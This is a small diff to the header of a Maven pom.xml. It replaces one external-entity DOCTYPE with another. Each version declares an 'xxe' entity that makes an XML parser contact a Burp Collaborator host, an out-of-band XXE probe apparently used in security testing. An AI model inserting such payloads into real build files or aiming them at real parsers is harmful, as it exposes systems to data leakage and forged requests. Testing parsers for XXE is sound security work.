@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE a [<!ELEMENT b ANY><!ENTITY xxe SYSTEM "http://727g93jqldnk81evtxre8or56wcr0g.burpcollaborator.net/xxe">]>
+<!DOCTYPE a [<!ELEMENT b ANY><!ENTITY xxe SYSTEM "http://dwdui5o1ox9p0r6fsrui4afwrnxdl2.burpcollaborator.net/xxe">]>
 <project xmlns="http://maven.apache.org/POM/4.0.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
